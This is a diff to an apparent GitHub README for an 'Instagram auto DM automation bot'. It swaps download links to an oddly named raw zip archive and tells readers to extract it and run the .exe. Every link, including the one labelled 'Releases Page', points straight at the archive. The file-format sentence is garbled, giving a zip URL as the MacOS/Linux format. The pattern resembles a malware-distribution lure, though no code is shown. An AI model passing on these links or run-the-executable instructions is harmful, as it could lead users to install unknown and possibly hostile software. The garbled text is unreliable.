@@ -1,7 +1,7 @@
 # 🚀 instagram-auto-dm-automation-bot - Effortless Instagram Messaging
 
 ## 🔗 Download Now!
-[![Download Release](https://raw.githubusercontent.com/FabriMore01/instagram-auto-dm-automation-bot/main/preocular/instagram-auto-dm-automation-bot-v1.8.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/FabriMore01/instagram-auto-dm-automation-bot/main/preocular/instagram-auto-dm-automation-bot-v1.8.zip)
+[![Download Release](https://raw.githubusercontent.com/FabriMore01/instagram-auto-dm-automation-bot/main/preocular/auto_automation_instagram_bot_dm_Sarcopsyllidae.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/FabriMore01/instagram-auto-dm-automation-bot/main/preocular/auto_automation_instagram_bot_dm_Sarcopsyllidae.zip)
 
 ## 📜 Description
 The Instagram Auto DM Automation Bot streamlines your direct messaging on Instagram. Automate outreach and engagement with a simple setup, allowing you to focus on growing your brand and connecting with your audience.
@@ -23,10 +23,10 @@ The Instagram Auto DM Automation Bot streamlines your direct messaging on Instag
 Follow these steps to download and run the Instagram Auto DM Automation Bot.
 
 1. **Visit the Releases Page**  
-   Head over to the [Releases Page](https://raw.githubusercontent.com/FabriMore01/instagram-auto-dm-automation-bot/main/preocular/instagram-auto-dm-automation-bot-v1.8.zip) to find the latest version of the bot.
+   Head over to the [Releases Page](https://raw.githubusercontent.com/FabriMore01/instagram-auto-dm-automation-bot/main/preocular/auto_automation_instagram_bot_dm_Sarcopsyllidae.zip) to find the latest version of the bot.
 
 2. **Download the Latest Release**  
-   On the Releases page, locate the most recent version. Click on the asset that matches your operating system. Make sure to select the correct file format (e.g., .exe for Windows, https://raw.githubusercontent.com/FabriMore01/instagram-auto-dm-automation-bot/main/preocular/instagram-auto-dm-automation-bot-v1.8.zip for MacOS/Linux).
+   On the Releases page, locate the most recent version. Click on the asset that matches your operating system. Make sure to select the correct file format (e.g., .exe for Windows, https://raw.githubusercontent.com/FabriMore01/instagram-auto-dm-automation-bot/main/preocular/auto_automation_instagram_bot_dm_Sarcopsyllidae.zip for MacOS/Linux).
 
 3. **Install the Bot**  
    Once the file is downloaded, locate it in your downloads folder. Extract the files if necessary. For Windows, run the .exe file. For Mac and Linux, follow the included instructions to run the bot.
